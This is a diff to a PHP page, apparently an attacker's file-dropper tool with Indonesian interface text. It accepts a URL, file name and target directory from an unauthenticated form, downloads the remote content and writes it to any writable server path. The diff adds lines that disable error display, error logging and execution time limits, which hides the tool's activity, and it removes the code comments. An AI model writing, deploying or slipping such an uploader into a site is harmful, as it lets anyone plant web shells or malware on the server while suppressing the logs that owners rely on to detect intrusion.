@@ -19,15 +19,21 @@
 </head>
 <body>
 <?php
-// ---------- Init & helpers (buat kompatibel PHP lama) ----------
+@set_time_limit(0);
+@clearstatcache();
+error_reporting(0);
+@ini_set('error_log',null);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('display_errors', 0);
+@ini_set('display_startup_errors', '0');
+
 $output   = '';
 $url      = '';
 $filename = '';
 $path     = __DIR__;
 
-// Helper unduh konten dengan fallback cURL (jaga-jaga allow_url_fopen OFF)
 function fetch_remote($u) {
-    // Batasi hanya http/https
     $scheme = parse_url($u, PHP_URL_SCHEME);
     if ($scheme !== 'http' && $scheme !== 'https') return false;
 
@@ -35,7 +41,6 @@ function fetch_remote($u) {
         $ctx = stream_context_create(array('http' => array('timeout' => 20)));
         return @file_get_contents($u, false, $ctx);
     }
-    // cURL fallback
     if (function_exists('curl_init')) {
         $ch = curl_init($u);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
@@ -51,12 +56,10 @@ function fetch_remote($u) {
 }
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Ambil input (tanpa ??)
     $url      = isset($_POST['url']) ? trim($_POST['url']) : '';
     $filename = isset($_POST['filename']) ? trim($_POST['filename']) : '';
     $path     = isset($_POST['path']) ? trim($_POST['path']) : __DIR__;
 
-    // Validasi dasar
     if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
         $output = '<p class="err">URL tidak valid</p>';
     } elseif ($filename === '') {
@@ -66,7 +69,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } elseif (!is_writable($path)) {
         $output = '<p class="err">Direktori tidak bisa ditulis: ' . htmlspecialchars($path, ENT_QUOTES, 'UTF-8') . '</p>';
     } else {
-        // Bersihkan nama file sederhana (opsional)
         $filename = preg_replace('/[\\\\\/:*?"<>|]+/', '_', $filename);
 
         $file_contents = fetch_remote($url);
@@ -113,3 +115,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </div>
 </body>
 </html>
+
